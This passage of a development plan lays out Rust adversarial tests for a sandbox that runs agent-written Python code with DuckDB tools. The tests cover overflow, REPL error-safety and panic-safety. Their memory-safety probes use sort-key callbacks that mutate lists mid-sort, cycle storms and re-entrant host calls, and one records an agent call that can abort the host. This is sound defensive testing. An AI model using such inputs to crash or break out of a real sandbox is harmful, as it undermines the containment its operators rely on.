    #[test]
    fn scalar_i64_addition_overflow_surfaces_err_not_silent() {
        let dir = tmp_dir("rc-scalovf");
        let p = sales_parquet(&dir);
        let mut s = Session::new("rc-scalovf").unwrap();
        // Addition of two INT64-max literals overflows INT64 inside DuckDB.
        let err = s.run_code(&format!("scalar(register({p:?}), '9223372036854775807 + 9223372036854775807')")).unwrap_err();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(matches!(err, DropletError::Duckdb(_)), "i64 overflow in scalar() must surface a contained DuckDB error, never wrap/truncate silently; got {err:?}"); // expected: Err(Duckdb(... Out of Range ...))
    }

    /// `HOLDS` — Distinct from the addition-overflow angle: here the overflow is in the i128->i64 narrowing CAST (scalar_i64's load-bearing cast), a different DuckDB code path (Conversion vs Out-of-Range).
    /// seam: engine_duckdb.rs scalar_i64 CAST(expr AS BIGINT) where expr is HUGEINT(i128) > i64::MAX (the i128->i64 narrowing cast itself)
    #[test]
    fn scalar_hugeint_to_i64_cast_overflow_surfaces_err() {
        let dir = tmp_dir("rc-hugecast");
        let p = sales_parquet(&dir);
        let mut s = Session::new("rc-hugecast").unwrap();
        // A HUGEINT value just past i64::MAX; the scalar_i64 BIGINT cast must reject it, not wrap to negative.
        let err = s.run_code(&format!("scalar(register({p:?}), 'CAST(9223372036854775808::HUGEINT AS BIGINT)')")).unwrap_err();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(matches!(err, DropletError::Duckdb(_)), "HUGEINT(i128) exceeding i64 must fail the BIGINT cast in scalar(), not silently wrap; got {err:?}"); // expected: Err(Duckdb(... Conversion Error ... out of range for ... INT64 ...))
    }

    /// `HOLDS` — Type-confusion at the value-move boundary: an out-of-vocabulary cell type must be a clean Err, not reach the infallible-by-assumption down!() .expect() downcast.
    /// seam: engine_duckdb.rs cell_value match -> a DataType (Decimal128) not in the supported arm set -> DropletError::UnsupportedType; convert.rs Rows path; guards the down!() .expect() downcasts
    #[test]
    fn hugeint_column_via_to_rows_is_unsupported_type_not_panic() {
        let mut s = Session::new("rc-hugecol").unwrap();
        // A HUGEINT (Arrow Decimal128) column read via to_rows: cell_value has no Decimal128 arm.
        let res = s.run_code("to_rows(local_sql('SELECT 170141183460469231731687303715884105727::HUGEINT AS h', []))");
        let err = res.unwrap_err();
        assert!(matches!(err, DropletError::UnsupportedType(_)), "a HUGEINT/Decimal128 result column must surface a contained UnsupportedType at the read-out, never a downcast panic or garbage; got {err:?}"); // expected: Err(UnsupportedType("Decimal128(38, 0)"))
    }

    /// `HOLDS` — Boundary-correctness sibling of the cap: a degenerate single-value crossing (NULL) must fail loudly so a zero-row analysis can't masquerade as a real 0 — a different seam (query_row NULL decode) than overflow.
    /// seam: engine_duckdb.rs scalar_i64 conn.query_row::<i64> decoding a NULL aggregate (empty filter) -> InvalidColumnType folded into DropletError::Duckdb
    #[test]
    fn empty_aggregate_null_scalar_surfaces_err_not_silent_zero() {
        let dir = tmp_dir("rc-nullscal");
        let p = sales_parquet(&dir);
        let mut s = Session::new("rc-nullscal").unwrap();
        // Filter matches nothing, so SUM(amt) is NULL; scalar() must NOT silently coerce NULL to 0.
        let err = s.run_code(&format!("scalar(filter_rows(register({p:?}), 'amt > 1e9'), 'SUM(amt)')")).unwrap_err();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(matches!(err, DropletError::Duckdb(_)), "a NULL aggregate (empty group) must surface a contained engine error, not silently cross as 0/garbage; got {err:?}"); // expected: Err(Duckdb(InvalidColumnType(.. Null)))
    }

    /// `HOLDS` — The cap is a PER-SESSION configurable field, not a global const; verifies the default is 1000 AND that lowering it is actually honored on the value-move path.
    /// seam: engine_duckdb.rs max_result_rows field + set_max_result_rows/max_result_rows; to_rows clamp honors the per-session knob (the field droplet-py surfaces as Engine(max_result_rows=...))
    #[test]
    fn lowered_per_session_cap_is_honored_on_readout() {
        use crate::engine_duckdb::DuckEngine;
        let mut eng = DuckEngine::new_in_memory().unwrap();
        assert_eq!(eng.max_result_rows(), DEFAULT_MAX_RESULT_ROWS); // default preserved
        eng.set_max_result_rows(2);
        let dir = tmp_dir("rc-cap-cfg");
        let big = dir.join("b.parquet").to_str().unwrap().to_string();
        write_parquet(&big, "SELECT * FROM range(100)");
        let ds = eng.register_parquet(&big).unwrap();
        let n: usize = eng.to_rows(&ds).unwrap().iter().map(|b| b.num_rows()).sum();
        let _ = std::fs::remove_dir_all(&dir);
        assert_eq!(n, 2, "a lowered per-session cap (2) must clamp every read-out; the default (1000) must be the starting value"); // expected: 2 rows out of 100
    }

    /// `PROBE` — Pre-allocation / huge-int bomb reached purely through the run_code value path (no engine). Verifies Droplet contains a Monty bignum blowup as Ok-or-Err, never a panic across the boundary.
    /// seam: monty BigInt construction reached through session.rs run_code (Droplet's surface) -> ReplProgress::Complete value; pre-allocation safety of a single huge object
    #[test]
    fn huge_int_literal_construction_does_not_panic_session() {
        let mut s = Session::new("rc-bigint").unwrap();
        // A huge int built in pure Monty; Droplet must contain whatever Monty does (result or Err), never panic.
        let res = s.run_code("2**100000");
        // CONTRACT (Droplet's surface, not Monty internals): reached through run_code it must NOT panic/UAF; it must surface a contained DropletError OR a correct MontyObject. Ok or Err both acceptable; a crash is not.
        match res {
          Ok(v) => assert!(matches!(v, MontyObject::BigInt(_) | MontyObject::Int(_)), "huge int must come back as a (Big)Int, got {v:?}"),
          Err(e) => assert!(matches!(e, DropletError::Monty(_) | DropletError::Duckdb(_) | DropletError::BadArg(_)), "huge int must fail as a contained DropletError, got {e:?}"),
        }
    }
```

- [ ] **Step 2: Run + triage**

Run: `RUST_MIN_STACK=16777216 cargo test -p droplet-core security::result_cap`
Expected: HOLDS green; triage PROBE/CANARY per the Probe protocol (PROBE red → finding ledger + convert to CANARY; CANARY red → gap closed, flip).

- [ ] **Step 3: Commit**

```bash
git add -A && git commit -m "test(security): result_cap adversarial angles (11 tests)"
```

---

## Task 9: Error-safety / REPL poisoning / panic-safety (19 angles)

**Files:** Create `crates/droplet-core/src/security/error_safety.rs`. **Reference seams:** `session.rs` settle()/REPL survival, no host panic across the dispatch loop.
**Interfaces — Consumes:** the Task 1 helper kit (dispatch/catch_dispatch/tmp_dir/sales_parquet).

- [ ] **Step 1: Write the class file (full code)**

```rust
// crates/droplet-core/src/security/error_safety.rs
//! Error-safety / REPL poisoning / panic-safety — adversarial angles. seam: `session.rs` settle()/REPL survival, no host panic across the dispatch loop.
#![allow(unused_imports)]
use monty::MontyObject;
use crate::DropletError;
use crate::session::Session;
use crate::engine_duckdb::{DuckEngine, Dataset, DEFAULT_MAX_RESULT_ROWS};
use crate::registry::Registry;
use crate::tool::{Tool, ToolCx};
use super::{dispatch, catch_dispatch, tmp_dir, sales_parquet, write_parquet, list_len};

    /// `HOLDS` — Baseline recoverable run-time NameError path through settle's ReplStartError restore.
    /// seam: session.rs settle(): feed_start raises NameError -> ReplStartError carries REPL back, repl restored
    #[test]
    fn recoverable_undefined_name_errs_and_repl_survives() {
        let mut s = Session::new("err-undef").unwrap();
        let e = s.run_code("undefined_name_here + 1");
        let after = s.run_code("1 + 2");
        assert!(matches!(e, Err(DropletError::Monty(_))), "undefined name must fold to Monty err, got {e:?}"); assert_eq!(after.unwrap(), MontyObject::Int(3), "REPL must survive a recoverable error");
    }

    /// `HOLDS` — Parse-time failure distinct from run-time NameError; both must restore REPL but enter settle via a different monty path.
    /// seam: session.rs settle() on feed_start PARSE failure (SyntaxError) vs run-time
    #[test]
    fn syntax_error_errs_and_repl_survives() {
        let mut s = Session::new("err-syntax").unwrap();
        let e = s.run_code("def (:");
        let after = s.run_code("6 + 6");
        assert!(matches!(e, Err(DropletError::Monty(_))), "syntax error must fold to Monty err, got {e:?}"); assert_eq!(after.unwrap(), MontyObject::Int(12), "a parse error must not poison the session");
    }

    /// `HOLDS` — Explicit `raise` statement gadget — distinct from implicit name/syntax/runtime errors.
    /// seam: session.rs run_code: explicit `raise` propagates as MontyException through settle
    #[test]
    fn agent_raise_custom_exception_errs_and_survives() {
        let mut s = Session::new("err-raise").unwrap();
        let e = s.run_code("raise ValueError('boom')");
        let after = s.run_code("4 + 4");
        assert!(matches!(e, Err(DropletError::Monty(_))), "agent-raised exception must fold to Monty err, got {e:?}"); assert_eq!(after.unwrap(), MontyObject::Int(8), "an agent-raised exception must not poison the session");
    }

    /// `HOLDS` — Inverse of a raised error: sandbox self-recovers, run_code stays Ok — proves host non-involvement on self-handled exceptions. Pairs with agent_cannot_catch_host_tool_error to bound the try/except reach.
    /// seam: monty sandbox handles its own exception fully inside feed_start; host run_code never sees Err
    #[test]
    fn agent_try_except_self_handled_completes_ok() {
        let mut s = Session::new("err-tryexcept").unwrap();
        let v = s.run_code("x = 0\ntry:\n    raise ValueError('x')\nexcept ValueError:\n    x = 42\nx");
        assert_eq!(v.unwrap(), MontyObject::Int(42), "agent-handled exception must complete to Ok with the host uninvolved");
    }

    /// `HOLDS` — STATE continuity, not just survival — asserts the restored REPL preserves the prior namespace. Distinct from the bare survive tests.
    /// seam: session.rs persistent MontyRepl: bindings survive a settle-restored REPL (same repl object handed back)
    #[test]
    fn namespace_persists_across_recoverable_error() {
        let mut s = Session::new("err-persist").unwrap();
        s.run_code("g = 7").unwrap();
        let _ = s.run_code("undefined_name_here");
        let after = s.run_code("g + 1");
        assert_eq!(after.unwrap(), MontyObject::Int(8), "a binding from before a recoverable error must still resolve afterward");
    }

    /// `HOLDS` — Exercises the ExtFunctionResult::NotFound branch (inventory miss) which monty turns into a recoverable NameError + resumes — distinct from a tool that errors DURING dispatch (those consume the REPL).
    /// seam: session.rs FunctionCall arm: inventory miss -> ExtFunctionResult::NotFound -> sandbox NameError -> settle restores REPL
    #[test]
    fn unknown_tool_name_surfaces_nameerror_and_survives() {
        let mut s = Session::new("err-unktool").unwrap();
        let e = s.run_code("no_such_tool(1)");
        let after = s.run_code("5 + 5");
        assert!(matches!(e, Err(DropletError::Monty(_))), "calling an unregistered tool must fold to a Monty err (NameError), got {e:?}"); assert_eq!(after.unwrap(), MontyObject::Int(10), "an unknown-tool call must not poison the session");
    }

    /// `PROBE` — The dispatch-time hard-error path: error escapes via ? AFTER repl.take(), so REPL is consumed and the next call is a defined clean NotFound. Asserts the required contract (no panic). Distinct from settle-restored recoverable errors.
    /// seam: session.rs: (tool.dispatch)(...)? propagates Duckdb err AFTER repl.take() -> repl stays None
    #[test]
    fn hard_sql_error_consumes_repl_then_clean_err_not_panic() {
        let dir = tmp_dir("err-hardsql");
        let p = sales_parquet(&dir);
        let mut s = Session::new("err-hardsql").unwrap();
        let e1 = s.run_code(&format!("query({p:?}, 'SELECT nonesuch FROM data')"));
        let e2 = s.run_code("1 + 1");
        let _ = std::fs::remove_dir_all(&dir);
        assert!(matches!(e1, Err(DropletError::Duckdb(_))), "bad SQL must fold to a Duckdb err, got {e1:?}"); assert!(matches!(e2, Err(DropletError::NotFound(_))), "a consumed REPL must yield a CLEAN NotFound, not a panic or a second engine error, got {e2:?}");
    }

    /// `PROBE` — Idempotence/stability of the poisoned state across repeated calls — distinct from the single-shot consume test; proves degradation is predictable, not diverging.
    /// seam: session.rs: repl.take().ok_or_else(NotFound) idempotent once repl=None
    #[test]
    fn consumed_repl_stays_clean_err_on_repeated_calls() {
        let dir = tmp_dir("err-consumed");
        let p = sales_parquet(&dir);
        let mut s = Session::new("err-consumed").unwrap();
        let _ = s.run_code(&format!("query({p:?}, 'SELECT nonesuch FROM data')"));
        let e2 = s.run_code("1");
        let e3 = s.run_code("2");
        let _ = std::fs::remove_dir_all(&dir);
        assert!(matches!(e2, Err(DropletError::NotFound(_))), "got {e2:?}"); assert!(matches!(e3, Err(DropletError::NotFound(_))), "every call against a consumed REPL must stay a clean NotFound, got {e3:?}");
    }

    /// `PROBE` — Conversion-layer (FromArg) error path rather than engine — a type mismatch mid-thunk also propagates via ? and consumes the REPL. Distinct seam from Duckdb/BadHandle.
    /// seam: macros thunk FromArg::from_arg on args[i] -> BadArg propagates via ? from dispatch (conversion seam, not engine)
    #[test]
    fn bad_arg_type_consumes_repl_cleanly() {
        let mut s = Session::new("err-badarg").unwrap();
        let e1 = s.run_code("query(123, 'SELECT 1')");
        let e2 = s.run_code("2 + 2");
        assert!(matches!(e1, Err(DropletError::BadArg(_))), "wrong arg type must fold to BadArg, got {e1:?}"); assert!(matches!(e2, Err(DropletError::NotFound(_))), "a BadArg from the thunk consumes the REPL -> next call is a clean NotFound, got {e2:?}");
    }

    /// `PROBE` — Handle-forgery path (registry.require miss) for an in-range u64 — distinct from BadArg (type) and the negative-handle (try_from) edge.
    /// seam: convert.rs Dataset::from_arg -> cx.handles.require(handle) -> BadHandle propagates from dispatch
    #[test]
    fn bad_handle_forgery_consumes_repl_cleanly() {
        let mut s = Session::new("err-badhandle").unwrap();
        let e1 = s.run_code("to_rows(999)");
        let e2 = s.run_code("3 + 3");
        assert!(matches!(e1, Err(DropletError::BadHandle(999))), "a forged in-range handle must be BadHandle(999), got {e1:?}"); assert!(matches!(e2, Err(DropletError::NotFound(_))), "a BadHandle consumes the REPL -> clean NotFound next, got {e2:?}");
    }

    /// `PROBE` — Targets the i64->u64 try_from guard specifically — distinct gadget from the in-range-but-missing BadHandle path; an unguarded conversion here would panic on overflow.
    /// seam: convert.rs Dataset::from_arg: u64::try_from(i64) guard on a negative int (the arithmetic-edge that could underflow)
    #[test]
    fn negative_handle_is_bad_arg_not_panic() {
        let mut s = Session::new("err-neg").unwrap();
        let e1 = s.run_code("to_rows(-1)");
        let e2 = s.run_code("9 + 9");
        assert!(matches!(e1, Err(DropletError::BadArg(_))), "a negative handle must be a clean BadArg ('dataset handle must be non-negative'), not an arithmetic panic, got {e1:?}"); assert!(matches!(e2, Err(DropletError::NotFound(_))), "the negative-handle BadArg consumes the REPL -> clean NotFound, got {e2:?}");
    }

    /// `PROBE` — Asymmetry contract: the sandbox can catch its OWN python exceptions but CANNOT catch a host-dispatch error because ? returns before call.resume re-injects anything. A future change that let the sandbox swallow tool errors would flip this. Security-relevant (an agent must not mask host failures).
    /// seam: session.rs: dispatch ? short-circuits BEFORE call.resume, so a host error never re-enters the sandbox for try/except to catch
    #[test]
    fn agent_cannot_catch_host_tool_error() {
        let mut s = Session::new("err-toolcatch").unwrap();
        let v = s.run_code("ok=0\ntry:\n    to_rows(999)\nexcept Exception:\n    ok=1\nok");
        let after = s.run_code("12 + 12");
        assert!(matches!(v, Err(DropletError::BadHandle(999))), "a hard host-tool error must escape past the agent's try/except as a host DropletError, not be swallowed in-sandbox, got {v:?}"); assert!(matches!(after, Err(DropletError::NotFound(_))), "and it still consumes the REPL, got {after:?}");
    }

    /// `PROBE` — Error mid-suspension with another tool call on the stack (inner-as-argument) — checks the suspend/resume loop unwinds without panicking the pending outer call. Distinct control-flow shape from single-call errors.
    /// seam: session.rs suspend/resume across NESTED FunctionCalls; inner dispatch err propagates via ? while outer call is pending
    #[test]
    fn nested_failing_tool_call_in_args_is_clean() {
        let mut s = Session::new("err-nested").unwrap();
        let e1 = s.run_code("to_rows(to_rows(999))");
        let e2 = s.run_code("11 + 11");
        assert!(matches!(e1, Err(DropletError::BadHandle(999))), "the inner failing tool call must surface BadHandle, not a panic from a half-applied outer call, got {e1:?}"); assert!(matches!(e2, Err(DropletError::NotFound(_))), "REPL consumed cleanly, got {e2:?}");
    }

    /// `HOLDS` — Two distinct builtin-raise gadgets (assert, integer //0) in sequence — proves multiple recoverable errors each restore the REPL with no cumulative poisoning. Different failure family from name/syntax.
    /// seam: session.rs settle: AssertionError / ZeroDivisionError raised in feed_start are REPL-restoring; two in a row = no cumulative poisoning
    #[test]
    fn assertion_and_zerodiv_are_recoverable_and_survive() {
        let mut s = Session::new("err-assert").unwrap();
        let e1 = s.run_code("assert False, 'nope'");
        let e2 = s.run_code("1 // 0");
        let after = s.run_code("8 + 8");
        assert!(matches!(e1, Err(DropletError::Monty(_))), "assert must fold to Monty err, got {e1:?}"); assert!(matches!(e2, Err(DropletError::Monty(_))), "zero-division must fold to Monty err, got {e2:?}"); assert_eq!(after.unwrap(), MontyObject::Int(16), "two consecutive recoverable runtime errors must not poison the session");
    }

    /// `HOLDS` — Degenerate-input robustness: empty / comment-only code is a parser edge that must map to None and not trip the Complete arm. Distinct from all error-raising angles.
    /// seam: session.rs Complete arm with no last expression -> MontyObject::None (degenerate parser inputs)
    #[test]
    fn empty_and_comment_only_code_is_ok_none_and_survives() {
        let mut s = Session::new("err-empty").unwrap();
        let e1 = s.run_code("");
        let e2 = s.run_code("# just a comment");
        let after = s.run_code("10 + 10");
        assert_eq!(e1.unwrap(), MontyObject::None, "empty program must complete to None, not error or panic"); assert_eq!(e2.unwrap(), MontyObject::None, "comment-only program must complete to None"); assert_eq!(after.unwrap(), MontyObject::Int(20), "degenerate inputs must leave the session usable");
    }

    /// `PROBE` — catch_unwind umbrella asserting ABSENCE of unwinding across the whole recoverable-error family — distinct from any single error's value assertion. Fresh Session per input so a consumed REPL never confounds the next.
    /// seam: session.rs run_code overall panic-safety across heterogeneous error inputs (catch_unwind umbrella)
    #[test]
    fn run_code_never_panics_under_a_burst_of_mixed_errors() {
        use std::panic::{catch_unwind, AssertUnwindSafe};
        let inputs = ["undefined_x", "raise RuntimeError('x')", "1//0", "def (:", "no_such_tool(1)", "assert False", "", "# c"];
        let res = catch_unwind(AssertUnwindSafe(|| {
            for (i, code) in inputs.iter().enumerate() {
                let mut s = Session::new(&format!("err-burst-{i}")).unwrap();
                let _ = s.run_code(code);
            }
        }));
        assert!(res.is_ok(), "run_code must never panic/process-abort across a burst of heterogeneous error inputs");
    }

    /// `PROBE` — Genuinely new mechanism the catalog misses entirely: the macro thunk does unchecked &args[i] indexing. If monty forwards an agent call with fewer positional args than the tool declares, the host panics on slice OOB — a host-side crash reachable from agent code. Distinct from BadArg (wrong TYPE with correct arity).
    /// seam: macros/src/lib.rs thunk line 70: `&args[#indices]` direct indexing with NO arity guard; a call with fewer args than params indexes out of bounds
    #[test]
    fn under_arity_tool_call_must_not_panic_on_args_index() {
        use std::panic::{catch_unwind, AssertUnwindSafe};
        let res = catch_unwind(AssertUnwindSafe(|| {
            let mut s = Session::new("err-underarity").unwrap();
            // to_rows expects (ds); call it with ZERO args -> thunk hits &args[0] on an empty slice.
            let e1 = s.run_code("to_rows()");
            let e2 = s.run_code("1 + 1");
            (format!("{e1:?}"), format!("{e2:?}"))
        }));
        let (e1, _e2) = res.expect("under-arity tool call must NOT panic via args[i] out-of-bounds indexing in the dispatch thunk; it must surface a contained DropletError"); assert!(e1.contains("Err("), "a missing-argument tool call must surface a contained Err (BadArg/Monty TypeError), got {e1}");
    }

    /// `PROBE` — The mirror of under-arity: extra args. The thunk indexes only [0..declared) so extras are silently dropped at the indexing layer (monty may TypeError first). Distinct gadget — tests the OPPOSITE arity edge for panic-safety / argument-smuggling.
    /// seam: macros thunk: extra positional args beyond declared params are simply not indexed; verify no panic and REPL stays usable
    #[test]
    fn over_arity_extra_args_ignored_or_clean_err_no_panic() {
        use std::panic::{catch_unwind, AssertUnwindSafe};
        let res = catch_unwind(AssertUnwindSafe(|| {
            let mut s = Session::new("err-overarity").unwrap();
            // register expects (path); pass an extra trailing arg.
            let e1 = s.run_code("register('x.parquet', 'extra', 999)");
            let e2 = s.run_code("2 + 2");
            (format!("{e1:?}"), format!("{e2:?}"))
        }));
        let (e1, _e2) = res.expect("extra positional args to a tool must not panic the dispatch thunk"); assert!(e1.contains("Err("), "over-arity call should surface a contained Err (Duckdb missing-file or Monty TypeError), not Ok with silent arg drop ideally — but at minimum must not panic; got {e1}");
    }

    /// `PROBE` — The catalog's arity-panic PROBEs all use the dispatch()/catch_dispatch single-tool helper; NONE drive the panic through the REAL run_code suspend/resume loop. This is the end-to-end version proving the host actually unwinds across run_code (and by extension would cross the PyO3 boundary). Distinct seam: session.rs:105-117 FunctionCall arm + macro thunk, not the isolated thunk. If Monty pre-validates arity it PASSES as a recoverable Monty err; if it forwards the short list, catch_unwind FAILS = the real finding. Self-classifying; MUST be run.
    /// seam: (gap-fill, coverage critic)
    #[test]
    fn run_code_wrong_arity_tool_call_is_contained_not_host_panic() {
        use std::panic::{catch_unwind, AssertUnwindSafe};
        let res = catch_unwind(AssertUnwindSafe(|| {
            let mut s = crate::session::Session::new("err-arity-runcode").unwrap();
            // Agent code calls the 2-arg `query` tool with ONE positional arg, THROUGH the real suspend/resume
            // FunctionCall arm (session.rs:113 has NO catch_unwind). If Monty forwards the short arg list, the
            // macro thunk's `&args[1]` (macros/src/lib.rs:70) panics and unwinds straight through run_code into the host.
            let e1 = s.run_code("query('/tmp/x.parquet')");
            let e2 = s.run_code("1 + 1");
            (format!("{e1:?}"), format!("{e2:?}"))
        }));
        let (e1, _e2) = res.expect("FINDING: a wrong-arity tool call from AGENT CODE panicked the host via the macro thunk's &args[i] OOB indexing inside run_code's FunctionCall arm (no catch_unwind at session.rs:113); an agent can abort the host with query('x')"); assert!(e1.contains("Err("), "a too-few-args tool call routed through run_code must surface a contained DropletError (BadArg) or a Monty TypeError, never a host panic; got {e1}");
    }
```

- [ ] **Step 2: Run + triage**

Run: `RUST_MIN_STACK=16777216 cargo test -p droplet-core security::error_safety`
Expected: HOLDS green; triage PROBE/CANARY per the Probe protocol (PROBE red → finding ledger + convert to CANARY; CANARY red → gap closed, flip).

- [ ] **Step 3: Commit**

```bash
git add -A && git commit -m "test(security): error_safety adversarial angles (19 tests)"
```

---

## Task 10: Abstract multi-hop memory-safety (the Hack-Monty class) (17 angles)

**Files:** Create `crates/droplet-core/src/security/memory_safety.rs`. **Reference seams:** monty GC + `list.sort(key=)` re-entrancy + cycles + type confusion, reached through `run_code`.
**Interfaces — Consumes:** the Task 1 helper kit (and the Task 2 budget).

- [ ] **Step 1: Write the class file (full code)**

```rust
// crates/droplet-core/src/security/memory_safety.rs
//! Abstract multi-hop memory-safety (the Hack-Monty class) — adversarial angles. seam: monty GC + `list.sort(key=)` re-entrancy + cycles + type confusion, reached through `run_code`.
#![allow(unused_imports)]
use monty::MontyObject;
use crate::DropletError;
use crate::session::Session;
use crate::engine_duckdb::{DuckEngine, Dataset, DEFAULT_MAX_RESULT_ROWS};
use crate::registry::Registry;
use crate::tool::{Tool, ToolCx};
use super::{dispatch, catch_dispatch, tmp_dir, sales_parquet, write_parquet, list_len};

    /// `HOLDS` — Attacks do_list_sort's mem::take detach + post-swap 'list modified during sort' guard — the exact CPython-style hardening against sort-key UAF. No other test grows the live list from inside the comparator.
    /// seam: monty types/list.rs do_list_sort (mem::take reentrancy guard) reached via session.rs run_code:98-117 suspend/resume; the headline Hack-Monty sort-key UAF shape
    #[test]
    fn sort_key_mutates_list_being_sorted() {
        let code = "L = [3, 1, 2, 5, 4]\ndef k(x):\n    L.append(99)\n    return x\ntry:\n    L.sort(key=k)\n    out = 'no_error'\nexcept ValueError:\n    out = 'caught_value_error'\nexcept Exception:\n    out = 'caught_other'\nout";
        let r = Session::new("ms-sort-mutate").unwrap().run_code(code);
        assert!(matches!(&r, Ok(MontyObject::String(_))) || matches!(&r, Err(DropletError::Monty(_))), "sort(key) that mutates the live list must terminate as an in-sandbox value (e.g. ValueError caught -> 'caught_value_error', or a guarded 'no_error') or a contained Monty error — NEVER a panic/UAF/segfault; got {r:?}");
    }

    /// `HOLDS` — Distinct from append: clear() drops the live list's element refs while the detached buffer is mid-permutation — exercises the drop/refcount path during sort, not length growth.
    /// seam: monty types/list.rs do_list_sort post-swap modification check; comparator key drops refs of the buffer under sort (clear path, not length-growth)
    #[test]
    fn sort_key_clears_list_being_sorted() {
        let code = "L = [3, 1, 2, 5, 4, 6, 7]\nseen = []\ndef k(x):\n    seen.append(x)\n    if len(seen) == 1:\n        L.clear()\n    return x\ntry:\n    L.sort(key=k)\n    out = ('ok', len(L))\nexcept Exception:\n    out = ('exc', len(L))\nout";
        let r = Session::new("ms-sort-clear").unwrap().run_code(code);
        assert!(r.is_ok() || matches!(r, Err(DropletError::Monty(_))), "clear() of the list mid-sort must resolve to a value or a contained Monty error, never panic/UAF; got {r:?}"); if let Ok(MontyObject::Tuple(t)) = &r { assert!(matches!(t.get(1), Some(MontyObject::Int(_))), "len(L) must be a valid non-negative int, proving no dangling backing buffer; got {r:?}"); }
    }

    /// `HOLDS` — Targets refcount-vs-stack-ownership: the sort must keep the detached buffer alive via a non-zero refcount while it is owned only on the Rust stack. Setting L=None must not drop it to zero. Distinct from clear (which empties) and append (which grows).
    /// seam: monty heap refcount + do_list_sort: rebinding the only name holding the list to None mid-sort must not free the buffer the sort owns on the Rust stack (heap.rs stack-held-value invariant)
    #[test]
    fn sort_key_drops_last_external_ref_to_sorted_list() {
        let code = "L = [4, 2, 3, 1]\ndef k(x):\n    global L\n    L = None\n    return x\ntry:\n    M = L\n    M.sort(key=k)\n    out = M\nexcept Exception:\n    out = 'exc'\nout";
        let r = Session::new("ms-sort-droplastref").unwrap().run_code(code);
        assert!(r.is_ok() || matches!(r, Err(DropletError::Monty(_))), "dropping the last external name binding to the list mid-sort must not free the buffer the sort holds on the Rust stack (UAF); expected sorted list or contained Monty error, got {r:?}");
    }

    /// `HOLDS` — Directly exercises the cycle collector: each iteration creates an unreachable a<->b reference cycle that pure refcounting cannot free, forcing collect_cycles to run repeatedly. Distinct mechanism from all sort/iterator/drop tests.
    /// seam: monty heap.rs Bacon-Rajan trial-deletion cycle collector, driven by churning unreachable a<->b cycles under session.rs's NoLimitTracker (resource.rs)
    #[test]
    fn reference_cycle_storm_triggers_cycle_collector() {
        let code = "for i in range(2000):\n    a = []\n    b = [a]\n    a.append(b)\n    a = None\n    b = None\n'done'";
        let r = Session::new("ms-cycle-storm").unwrap().run_code(code);
        assert!(matches!(&r, Ok(MontyObject::String(s)) if s == "done") || matches!(r, Err(DropletError::Monty(_))), "churning 2000 self-referential cycles must be reclaimed by the trial-deletion collector with no leak-crash/panic; got {r:?}");
    }

    /// `HOLDS` — Only angle that crosses the Droplet/Monty boundary mid-builtin via sort: each comparator key triggers a FunctionCall suspension handled by run_code's loop while the sort holds the detached buffer. Distinct re-entry SITE from the map test.
    /// seam: session.rs run_code suspend/resume (FunctionCall arm, lines 105-117) re-entered from inside a Monty sort key callback: sort -> key fn -> FunctionCall suspension -> tool dispatch (register+scalar) -> resume -> next key
    #[test]
    fn reentrant_host_dispatch_from_sort_key_callback() {
        let dir = std::env::temp_dir().join("droplet-ms-reentrant"); std::fs::create_dir_all(&dir).unwrap(); let p = dir.join("s.parquet"); let pp = p.to_str().unwrap().to_string(); { let conn = duckdb::Connection::open_in_memory().unwrap(); conn.execute_batch(&format!("COPY (SELECT 1 AS v) TO '{pp}' (FORMAT PARQUET)")).unwrap(); }
        let code = format!("rows = [3, 1, 2]\ndef k(x):\n    h = register({pp:?})\n    return scalar(h, 'COUNT(*)') * x\nrows.sort(key=k)\nrows");
        let r = Session::new("ms-reentrant").unwrap().run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_ok() || matches!(r, Err(DropletError::Monty(_)) | Err(DropletError::Duckdb(_)) | Err(DropletError::BadHandle(_))), "a host tool call (register+scalar) invoked from inside a sort key — a re-entrant suspend/resume from within a Monty builtin — must complete or surface a contained error, never corrupt suspend/resume state; got {r:?}"); if let Ok(MontyObject::List(items)) = &r { assert_eq!(items.len(), 3, "the sorted list must be intact after re-entrant dispatch; got {r:?}"); }
    }

    /// `HOLDS` — map's eager callback loop is a structurally distinct re-entrancy site from sort; each callback mints a fresh handle, stressing the handle registry's monotonic insert (registry.rs insert) under interleaved host dispatch.
    /// seam: monty builtins map() eager evaluate_function re-entering session.rs run_code FunctionCall dispatch per element — a structurally DIFFERENT re-entrancy site than sort; each callback mints a NEW handle via register()
    #[test]
    fn reentrant_host_dispatch_from_map_callback() {
        let dir = std::env::temp_dir().join("droplet-ms-map-reentrant"); std::fs::create_dir_all(&dir).unwrap(); let p = dir.join("m.parquet"); let pp = p.to_str().unwrap().to_string(); { let conn = duckdb::Connection::open_in_memory().unwrap(); conn.execute_batch(&format!("COPY (SELECT 7 AS v) TO '{pp}' (FORMAT PARQUET)")).unwrap(); }
        let code = format!("def f(x):\n    return scalar(register({pp:?}), 'SUM(v)') + x\nout = list(map(f, [10, 20, 30]))\nout");
        let r = Session::new("ms-map-reentrant").unwrap().run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_ok() || matches!(r, Err(DropletError::Monty(_)) | Err(DropletError::Duckdb(_)) | Err(DropletError::BadHandle(_))), "host dispatch from inside map() callbacks must complete or surface a contained error; got {r:?}"); if let Ok(MontyObject::List(items)) = &r { assert_eq!(items, &vec![MontyObject::Int(17), MontyObject::Int(27), MontyObject::Int(37)], "map re-entry must produce correct results, proving suspend/resume + handle registry stayed coherent across 3 nested host calls; got {r:?}"); }
    }

    /// `HOLDS` — Lists use index-based iteration with no mutation guard, so the backing Vec reallocates underneath the iterator — pins that index revalidation (not a cached raw pointer into the old allocation) prevents a UAF on growth. Distinct from the dict/set guard tests which RAISE.
    /// seam: monty list index-based iteration (NO mutation guard for lists, unlike dict/set) reached via run_code; `for x in L: L.append(x)` reallocates the backing Vec under the live iterator
    #[test]
    fn list_self_append_during_iteration_index_growth() {
        let code = "L = [0]\nn = 0\nfor x in L:\n    n += 1\n    if n < 5000:\n        L.append(x)\n    if n >= 5000:\n        break\n(n, len(L))";
        let r = Session::new("ms-iter-append").unwrap().run_code(code);
